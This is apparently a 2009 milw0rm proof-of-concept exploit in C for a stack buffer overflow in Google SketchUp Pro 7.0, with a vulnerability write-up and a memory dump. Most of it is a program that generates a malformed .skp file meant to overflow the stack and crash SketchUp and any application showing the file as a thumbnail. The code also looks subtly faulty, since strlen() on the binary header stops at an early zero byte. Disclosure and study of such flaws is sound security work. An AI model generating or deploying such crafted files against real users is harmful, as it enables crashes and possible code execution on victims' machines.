/*
 
 
 Title:
 
 Google SketchUp Pro 7.0 Model File Handling Remote Stack Overflow PoC
 
 
 
 Vendor:
 
 Google Inc. (http://www.google.com)
 
 
 
 Product Web Page:
 
 http://www.sketchup.com
 http://sketchup.google.com
 
 
 
 Current Version:
 
 7.0.10247
 
 
 
 Summary:
 
 Google SketchUp Pro 7 is a suite of powerful features and
 applications for streamlining your professional 3D workflow.
 
 
 
 Description:
 
 Google SketchUp Pro 7.0 suffers from a memory corruption and stack based buffer
 overflow vulnerability. It fails to handle the .skp file format resulting in
 crash overflowing the memory stack, poping out the crash reporter tool from
 Google.
 
 EBX, ESI and EDI gets overwritten (depending of the offset). The issue is
 triggered when double-clicking the file or thru Open menu by just selecting
 the file. Same happens with the 2 other apps included in this Pro version of
 Google SketchUp. LayOut 2.0 (current version: 2.0.10247) suffers from the same
 issue when insering the .skp file by File -> Insert -> evil.skp file. Style
 Builder 1.0 (current version: 1.0.10247) by going Preview -> Change Model ->
 evil.skp file.
 
 Another issue is the DLL files provided with the Google SketchUp Pro package.
 ThumbsUp.dll and xerces-c_2_6.dll mingles with the Thumbnail view from Microsoft.
 If you select the created "SketchUp_PoC.skp" file, explorer.exe instantly crashes
 and restarts. Every application that uses Open Dialog Boxes will crash if you view
 the folder containing the PoC file in thumbnails view. Attaching files on e-mail
 thru Mozilla Firefox, viewing thumbnails of the PoC crashes Firefox with it's crash
 reporter, MS Office, Skype, MSN Messenger, etc...you name it.
 
 
 
 Vendor Notification Status:
 
 Vendor notified, fix scheduled to be included in the next upcoming release of Google
 SketchUp product.
 
 
 
 Tested On Microsoft Windows XP Professional Service Pack 3 (English)
 
 
 
 Vulnerability Discovered By:
 
 Gjoko 'LiquidWorm' Krstic
 
 liquidworm gmail com
 
 Zero Science Lab - http://www.zeroscience.org/
 
 22.07.2009
 
 
 
 ---------- Memory Snip ----------
 
 0012b310: 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141
 0012b330: 41414141 41414141 41414141 41414141 00120041 78138ced 38740c4c fffffffe
 0012b350: 78134c58 0012b384 7c809abc 7c809ac6 0012eee0 0012eee0 02c85744 0012b360
 0012b370: 02c85744 0012eda8 7c839ac0 7c809ad0 ffffffff 7c809ac6 7c809ac6 0084bdac
 0012b390: 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141
 0012b3b0: 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141
 0012b3d0: 00120041 78138ced 38740c4c fffffffe 78134c58 0012b414 7c809abc 7c809ac6
 0012b3f0: 0012eee0 0012eee0 02c85744 0012b3f0 02c85744 0012eda8 7c839ac0 7c809ad0
 0012b410: ffffffff 7c809ac6 7c809ac6 0084bdac 41414141 41414141 41414141 41414141
 0012b430: 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141
 0012b450: 41414141 41414141 41414141 41414141 00120041 78138ced 38740c4c fffffffe
 0012b470: 78134c58 0012b4a4 7c809abc 7c809ac6 0012eee0 0012eee0 02c85744 0012b480
 0012b490: 02c85744 0012eda8 7c839ac0 7c809ad0 ffffffff 7c809ac6 7c809ac6 0084bdac
 0012b4b0: 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141
 0012b4d0: 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141
 0012b4f0: 00120041 78138ced 38740c4c fffffffe 78134c58 0012b534 7c809abc 7c809ac6
 0012b510: 0012eee0 0012eee0 02c85744 0012b510 02c85744 0012eda8 7c839ac0 7c809ad0
 0012b530: ffffffff 7c809ac6 7c809ac6 0084bdac 41414141 41414141 41414141 41414141
 0012b550: 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141
 0012b570: 41414141 41414141 41414141 41414141 00120041 78138ced 38740c4c fffffffe
 0012b590: 78134c58 0012b5c4 7c809abc 7c809ac6 0012eee0 0012eee0 02c85744 0012b5a0
 0012b5b0: 02c85744 0012eda8 7c839ac0 7c809ad0 ffffffff 7c809ac6 7c809ac6 0084bdac
 0012b5d0: 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141
 0012b5f0: 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141
 0012b610: 00120041 78138ced 38740c4c fffffffe 78134c58 0012b654 7c809abc 7c809ac6
 
 --------- /Memory Snip ----------
 
 
*/
 
 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
 
#define BUFF_S 598897
#define SIZE_S 600858
#define FILE_N "SketchUp_PoC.skp"
 
FILE *filetzio;
 
char header[1961] = {
 
    0xFF, 0xFE, 0xFF, 0x0E, 0x53, 0x00, 0x6B, 0x00, 0x65, 0x00, 0x74, 0x00, 0x63, 0x00, 0x68, 0x00,  
    0x55, 0x00, 0x70, 0x00, 0x20, 0x00, 0x4D, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x65, 0x00, 0x6C, 0x00,  
    0xFF, 0xFE, 0xFF, 0x0B, 0x7B, 0x00, 0x37, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x31, 0x00,  
    0x30, 0x00, 0x32, 0x00, 0x34, 0x00, 0x37, 0x00, 0x7D, 0x00, 0xA5, 0x64, 0x9C, 0x7A, 0x5F, 0x28,  
    0x37, 0x4A, 0x8F, 0xBD, 0x7E, 0x93, 0x1F, 0xBA, 0x22, 0x92, 0xFF, 0xFE, 0xFF, 0x00, 0xA5, 0xB6,  
    0x67, 0x4A, 0xFF, 0xFF, 0x00, 0x00, 0x0B, 0x00, 0x43, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E,  
    0x4D, 0x61, 0x70, 0xFF, 0xFE, 0xFF, 0x09, 0x43, 0x00, 0x41, 0x00, 0x72, 0x00, 0x63, 0x00, 0x43,  
    0x00, 0x75, 0x00, 0x72, 0x00, 0x76, 0x00, 0x65, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF,  
    0x0A, 0x43, 0x00, 0x41, 0x00, 0x74, 0x00, 0x74, 0x00, 0x72, 0x00, 0x69, 0x00, 0x62, 0x00, 0x75,  
    0x00, 0x74, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x13, 0x43, 0x00, 0x41,  
    0x00, 0x74, 0x00, 0x74, 0x00, 0x72, 0x00, 0x69, 0x00, 0x62, 0x00, 0x75, 0x00, 0x74, 0x00, 0x65,  
    0x00, 0x43, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x61, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x65,  
    0x00, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0F, 0x43, 0x00, 0x41, 0x00, 0x74,  
    0x00, 0x74, 0x00, 0x72, 0x00, 0x69, 0x00, 0x62, 0x00, 0x75, 0x00, 0x74, 0x00, 0x65, 0x00, 0x4E,  
    0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x64, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF,  
    0x10, 0x43, 0x00, 0x42, 0x00, 0x61, 0x00, 0x63, 0x00, 0x6B, 0x00, 0x67, 0x00, 0x72, 0x00, 0x6F,  
    0x00, 0x75, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x49, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x67, 0x00, 0x65,  
    0x00, 0x09, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x07, 0x43, 0x00, 0x43, 0x00, 0x61, 0x00, 0x6D,  
    0x00, 0x65, 0x00, 0x72, 0x00, 0x61, 0x00, 0x05, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0A, 0x43,  
    0x00, 0x43, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x70, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x6E,  
    0x00, 0x74, 0x00, 0x0B, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x12, 0x43, 0x00, 0x43, 0x00, 0x6F,  
    0x00, 0x6D, 0x00, 0x70, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x42,  
    0x00, 0x65, 0x00, 0x68, 0x00, 0x61, 0x00, 0x76, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x05,  
    0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x14, 0x43, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x70,  
    0x00, 0x6F, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x44, 0x00, 0x65, 0x00, 0x66,  
    0x00, 0x69, 0x00, 0x6E, 0x00, 0x69, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x0A,  
    0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x12, 0x43, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x70,  
    0x00, 0x6F, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x73,  
    0x00, 0x74, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x63, 0x00, 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF,  
    0xFE, 0xFF, 0x15, 0x43, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x74, 0x00, 0x72,  
    0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x47, 0x00, 0x65,  
    0x00, 0x6F, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x74, 0x00, 0x72, 0x00, 0x79, 0x00, 0x00, 0x00, 0x00,  
    0x00, 0xFF, 0xFE, 0xFF, 0x11, 0x43, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x74,  
    0x00, 0x72, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x4C,  
    0x00, 0x69, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x12, 0x43,  
    0x00, 0x43, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 0x63,  
    0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x50, 0x00, 0x6F, 0x00, 0x69, 0x00, 0x6E,  
    0x00, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x06, 0x43, 0x00, 0x43, 0x00, 0x75,  
    0x00, 0x72, 0x00, 0x76, 0x00, 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0F, 0x43,  
    0x00, 0x44, 0x00, 0x65, 0x00, 0x66, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x69, 0x00, 0x74, 0x00, 0x69,  
    0x00, 0x6F, 0x00, 0x6E, 0x00, 0x4C, 0x00, 0x69, 0x00, 0x73, 0x00, 0x74, 0x00, 0x00, 0x00, 0x00,  
    0x00, 0xFF, 0xFE, 0xFF, 0x04, 0x43, 0x00, 0x44, 0x00, 0x69, 0x00, 0x62, 0x00, 0x03, 0x00, 0x00,  
    0x00, 0xFF, 0xFE, 0xFF, 0x0A, 0x43, 0x00, 0x44, 0x00, 0x69, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x6E,  
    0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF,  
    0x10, 0x43, 0x00, 0x44, 0x00, 0x69, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x69,  
    0x00, 0x6F, 0x00, 0x6E, 0x00, 0x4C, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x61, 0x00, 0x72,  
    0x00, 0x06, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x10, 0x43, 0x00, 0x44, 0x00, 0x69, 0x00, 0x6D,  
    0x00, 0x65, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x52, 0x00, 0x61,  
    0x00, 0x64, 0x00, 0x69, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x02, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF,  
    0x0F, 0x43, 0x00, 0x44, 0x00, 0x69, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x69,  
    0x00, 0x6F, 0x00, 0x6E, 0x00, 0x53, 0x00, 0x74, 0x00, 0x79, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x04,  
    0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0F, 0x43, 0x00, 0x44, 0x00, 0x72, 0x00, 0x61, 0x00, 0x77,  
    0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x45, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x6D, 0x00, 0x65,  
    0x00, 0x6E, 0x00, 0x74, 0x00, 0x09, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x05, 0x43, 0x00, 0x45,  
    0x00, 0x64, 0x00, 0x67, 0x00, 0x65, 0x00, 0x02, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x08, 0x43,  
    0x00, 0x45, 0x00, 0x64, 0x00, 0x67, 0x00, 0x65, 0x00, 0x55, 0x00, 0x73, 0x00, 0x65, 0x00, 0x01,  
    0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x07, 0x43, 0x00, 0x45, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x69,  
    0x00, 0x74, 0x00, 0x79, 0x00, 0x03, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x05, 0x43, 0x00, 0x46,  
    0x00, 0x61, 0x00, 0x63, 0x00, 0x65, 0x00, 0x03, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x12, 0x43,  
    0x00, 0x46, 0x00, 0x61, 0x00, 0x63, 0x00, 0x65, 0x00, 0x54, 0x00, 0x65, 0x00, 0x78, 0x00, 0x74,  
    0x00, 0x75, 0x00, 0x72, 0x00, 0x65, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x64,  
    0x00, 0x73, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0C, 0x43, 0x00, 0x46, 0x00, 0x6F,  
    0x00, 0x6E, 0x00, 0x74, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x67, 0x00, 0x65,  
    0x00, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x06, 0x43, 0x00, 0x47, 0x00, 0x72,  
    0x00, 0x6F, 0x00, 0x75, 0x00, 0x70, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x06, 0x43,  
    0x00, 0x49, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x67, 0x00, 0x65, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF,  
    0xFE, 0xFF, 0x06, 0x43, 0x00, 0x4C, 0x00, 0x61, 0x00, 0x79, 0x00, 0x65, 0x00, 0x72, 0x00, 0x02,  
    0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0D, 0x43, 0x00, 0x4C, 0x00, 0x61, 0x00, 0x79, 0x00, 0x65,  
    0x00, 0x72, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x67, 0x00, 0x65, 0x00, 0x72,  
    0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x05, 0x43, 0x00, 0x4C, 0x00, 0x6F, 0x00, 0x6F,  
    0x00, 0x70, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x09, 0x43, 0x00, 0x4D, 0x00, 0x61,  
    0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x69, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x0C, 0x00, 0x00,  
    0x00, 0xFF, 0xFE, 0xFF, 0x10, 0x43, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72,  
    0x00, 0x69, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x67,  
    0x00, 0x65, 0x00, 0x72, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x09, 0x43, 0x00, 0x50,  
    0x00, 0x61, 0x00, 0x67, 0x00, 0x65, 0x00, 0x4C, 0x00, 0x69, 0x00, 0x73, 0x00, 0x74, 0x00, 0x01,  
    0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0B, 0x43, 0x00, 0x50, 0x00, 0x6F, 0x00, 0x6C, 0x00, 0x79,  
    0x00, 0x6C, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x33, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00,  
    0x00, 0xFF, 0xFE, 0xFF, 0x0D, 0x43, 0x00, 0x52, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x74,  
    0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x68, 0x00, 0x69, 0x00, 0x70, 0x00, 0x00,  
    0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x10, 0x43, 0x00, 0x52, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x61,  
    0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x68, 0x00, 0x69, 0x00, 0x70,  
    0x00, 0x4D, 0x00, 0x61, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x11, 0x43,  
    0x00, 0x52, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x65, 0x00, 0x72, 0x00, 0x69, 0x00, 0x6E,  
    0x00, 0x67, 0x00, 0x4F, 0x00, 0x70, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x73,  
    0x00, 0x23, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0D, 0x43, 0x00, 0x53, 0x00, 0x65, 0x00, 0x63,  
    0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x50, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x6E,  
    0x00, 0x65, 0x00, 0x02, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0B, 0x43, 0x00, 0x53, 0x00, 0x68,  
    0x00, 0x61, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F,  
    0x00, 0x07, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x07, 0x43, 0x00, 0x53, 0x00, 0x6B, 0x00, 0x46,  
    0x00, 0x6F, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x09, 0x43,  
    0x00, 0x53, 0x00, 0x6B, 0x00, 0x65, 0x00, 0x74, 0x00, 0x63, 0x00, 0x68, 0x00, 0x43, 0x00, 0x53,  
    0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0E, 0x43, 0x00, 0x53, 0x00, 0x6B, 0x00, 0x65,  
    0x00, 0x74, 0x00, 0x63, 0x00, 0x68, 0x00, 0x55, 0x00, 0x70, 0x00, 0x4D, 0x00, 0x6F, 0x00, 0x64,  
    0x00, 0x65, 0x00, 0x6C, 0x00, 0x16, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0D, 0x43, 0x00, 0x53,  
    0x00, 0x6B, 0x00, 0x65, 0x00, 0x74, 0x00, 0x63, 0x00, 0x68, 0x00, 0x55, 0x00, 0x70, 0x00, 0x50,  
    0x00, 0x61, 0x00, 0x67, 0x00, 0x65, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x09, 0x43,  
    0x00, 0x53, 0x00, 0x6B, 0x00, 0x70, 0x00, 0x53, 0x00, 0x74, 0x00, 0x79, 0x00, 0x6C, 0x00, 0x65,  
    0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x10, 0x43, 0x00, 0x53, 0x00, 0x6B, 0x00, 0x70,  
    0x00, 0x53, 0x00, 0x74, 0x00, 0x79, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x6E,  
    0x00, 0x61, 0x00, 0x67, 0x00, 0x65, 0x00, 0x72, 0x00, 0x02, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF,  
    0x05, 0x43, 0x00, 0x54, 0x00, 0x65, 0x00, 0x78, 0x00, 0x74, 0x00, 0x09, 0x00, 0x00, 0x00, 0xFF,  
    0xFE, 0xFF, 0x0A, 0x43, 0x00, 0x54, 0x00, 0x65, 0x00, 0x78, 0x00, 0x74, 0x00, 0x53, 0x00, 0x74,  
    0x00, 0x79, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x05, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x08, 0x43,  
    0x00, 0x54, 0x00, 0x65, 0x00, 0x78, 0x00, 0x74, 0x00, 0x75, 0x00, 0x72, 0x00, 0x65, 0x00, 0x06,  
    0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0A, 0x43, 0x00, 0x54, 0x00, 0x68, 0x00, 0x75, 0x00, 0x6D,  
    0x00, 0x62, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF,  
    0xFE, 0xFF, 0x07, 0x43, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x74, 0x00, 0x65, 0x00, 0x78,  
    0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x09, 0x43, 0x00, 0x56, 0x00, 0x69, 0x00, 0x65,  
    0x00, 0x77, 0x00, 0x50, 0x00, 0x61, 0x00, 0x67, 0x00, 0x65, 0x00, 0x0B, 0x00, 0x00, 0x00, 0xFF,  
    0xFE, 0xFF, 0x0A, 0x43, 0x00, 0x57, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6D,  
    0x00, 0x61, 0x00, 0x72, 0x00, 0x6B, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x11, 0x43,  
    0x00, 0x57, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x72,  
    0x00, 0x6B, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x67, 0x00, 0x65, 0x00, 0x72,  
    0x00, 0x02, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x12, 0x45, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x2D,  
    0x00, 0x4F, 0x00, 0x66, 0x00, 0x2D, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69,  
    0x00, 0x6F, 0x00, 0x6E, 0x00, 0x2D, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00,  
    0x00, 0x01, 0x00, 0x00, 0x00, 0xB0, 0x04, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x03,  
    0x00, 0x04, 0x00, 0x43, 0x44, 0x69, 0x62, 0x04, 0x00, 0x00, 0x00, 0xFA, 0x02, 0x00, 0x00, 0x89,  
    0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, 0x00,  
    0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x44, 0x08, 0x06, 0x00, 0x00, 0x00, 0x49, 0x47, 0x3D, 0x69,  
    0x00, 0x00, 0x00, 0x04, 0x73, 0x42, 0x49, 0x54, 0x08, 0x08, 0x08, 0x08, 0x7C, 0x08, 0x64, 0x88,  
    0x00, 0x00, 0x00, 0x09, 0x70, 0x48, 0x59, 0x73, 0x00  
};
 
 
int main(int argc, char *argv[])
 
{
    printf("\n");
    printf("################################################################################");
    printf("\nGoogle SketchUp Pro 7.0 (.skp file) Remote Stack Overflow Proof Of Concept\n");
    printf("--------------------------------------------------------------------------------");
    printf("\t\tby LiquidWorm <liquidworm gmail com> - 2009\n\n");
    printf("################################################################################");
 
    char sploit[SIZE_S];
    char buffer[BUFF_S];
 
    memset(buffer,0x41,BUFF_S);
 
    memcpy(sploit,header,strlen(header));
    memcpy(sploit+strlen(header),buffer,BUFF_S);
 
    filetzio = fopen(FILE_N,"wb");
    
    if(filetzio==NULL)
        {
            perror ("Oops! Can't open file.\n");
        }
    
    fwrite(sploit,1,sizeof(sploit),filetzio);
    fclose(filetzio);
 
    sleep(2);
    printf("\n----> Creating PoC SketchUp Model File...\n");
    sleep(1);
    printf("\n----> File: %s successfully generated!\n", FILE_N);
 
    return 0;
 
}

// milw0rm.com [2009-08-01]
